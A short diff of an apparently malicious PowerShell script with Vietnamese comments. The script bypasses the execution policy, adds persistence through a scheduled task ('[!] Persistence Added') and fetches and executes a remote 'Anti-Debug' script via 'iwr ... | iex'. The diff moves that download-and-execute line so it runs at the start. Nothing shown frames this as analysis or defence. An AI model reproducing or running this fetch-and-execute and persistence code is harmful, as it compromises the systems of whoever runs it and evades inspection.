@@ -4,6 +4,8 @@
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
+iwr https://raw.githubusercontent.com/cossinadevil2k/Powershell-Anti-Debug/main/Best.ps1 -useb |iex
+
 $skid = "skid"
 
 # Kiểm tra xem script có quyền quản trị không
@@ -54,7 +56,7 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
-iwr https://raw.githubusercontent.com/cossinadevil2k/Powershell-Anti-Debug/main/Best.ps1 -useb |iex
+
 
 
 
